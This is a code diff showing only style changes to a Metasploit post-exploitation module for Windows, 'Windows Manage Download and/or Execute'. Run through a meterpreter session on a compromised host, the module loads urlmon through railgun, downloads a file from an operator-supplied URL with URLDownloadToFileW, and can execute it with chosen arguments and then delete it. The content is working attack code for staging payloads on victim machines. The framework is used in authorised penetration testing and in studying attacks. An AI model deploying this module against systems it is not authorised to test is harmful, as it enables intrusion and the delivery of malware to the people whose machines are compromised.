@@ -6,34 +6,35 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'                 => "Windows Manage Download and/or Execute",
-      'Description'          => %q{
-        This module will download a file by importing urlmon via railgun.
-        The user may also choose to execute the file with arguments via exec_string.
-      },
-      'License'              => MSF_LICENSE,
-      'Platform'             => ['win'],
-      'SessionTypes'         => ['meterpreter'],
-      'Author'               => ['RageLtMan <rageltman[at]sempervictus>']
-    ))
+                      'Name' => "Windows Manage Download and/or Execute",
+                      'Description' => '
+                        This module will download a file by importing urlmon via railgun.
+                        The user may also choose to execute the file with arguments via exec_string.
+                      ',
+                      'License' => MSF_LICENSE,
+                      'Platform' => ['win'],
+                      'SessionTypes' => ['meterpreter'],
+                      'Author' => ['RageLtMan <rageltman[at]sempervictus>']))
 
     register_options(
       [
         OptString.new('URL',           [true, 'Full URL of file to download' ]),
         OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),
         OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
-        OptBool.new(  'OUTPUT',        [true, 'Show execution output', true ]),
-        OptBool.new(  'EXECUTE',       [true, 'Execute file after completion', false ]),
-      ])
+        OptBool.new('OUTPUT',        [true, 'Show execution output', true ]),
+        OptBool.new('EXECUTE',       [true, 'Execute file after completion', false ]),
+      ]
+    )
 
     register_advanced_options(
       [
-        OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
-        OptInt.new(   'EXEC_TIMEOUT',  [true, 'Execution timeout', 60 ]),
-        OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
-      ])
+        OptString.new('EXEC_STRING', [false, 'Execution parameters when run from download directory' ]),
+        OptInt.new('EXEC_TIMEOUT', [true, 'Execution timeout', 60 ]),
+        OptBool.new('DELETE', [true, 'Delete file after execution', false ]),
+      ]
+    )
 
   end
 
@@ -41,17 +42,18 @@ class MetasploitModule < Msf::Post
 
   def add_railgun_urlmon
 
-    if client.railgun.libraries.find_all {|d| d.first == 'urlmon'}.empty?
-      session.railgun.add_dll('urlmon','urlmon')
+    if client.railgun.libraries.find_all { |d| d.first == 'urlmon' }.empty?
+      session.railgun.add_dll('urlmon', 'urlmon')
       session.railgun.add_function(
         'urlmon', 'URLDownloadToFileW', 'DWORD',
-          [
-            ['PBLOB', 'pCaller', 'in'],
-            ['PWCHAR','szURL','in'],
-            ['PWCHAR','szFileName','in'],
-            ['DWORD','dwReserved','in'],
-            ['PBLOB','lpfnCB','inout']
-      ])
+        [
+          ['PBLOB', 'pCaller', 'in'],
+          ['PWCHAR', 'szURL', 'in'],
+          ['PWCHAR', 'szFileName', 'in'],
+          ['DWORD', 'dwReserved', 'in'],
+          ['PBLOB', 'lpfnCB', 'inout']
+        ]
+      )
       vprint_good("urlmon loaded and configured")
     else
       vprint_status("urlmon already loaded")
@@ -90,13 +92,13 @@ class MetasploitModule < Msf::Post
 
     # get our file
     vprint_status("Downloading #{url} to #{outpath}")
-    client.railgun.urlmon.URLDownloadToFileW(nil,url,outpath,0,nil)
+    client.railgun.urlmon.URLDownloadToFileW(nil, url, outpath, 0, nil)
 
     # check our results
     begin
       out = session.fs.file.stat(outpath)
       print_status("#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
-    rescue
+    rescue StandardError
       print_error("File not found. The download probably failed")
       return
     end
@@ -108,7 +110,7 @@ class MetasploitModule < Msf::Post
 
         print_status("Executing file: #{cmd}")
         res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
-        print_good(res) if output and not res.empty?
+        print_good(res) if output && !res.empty?
       rescue ::Exception => e
         print_error("Unable to execute: #{e.message}")
       end
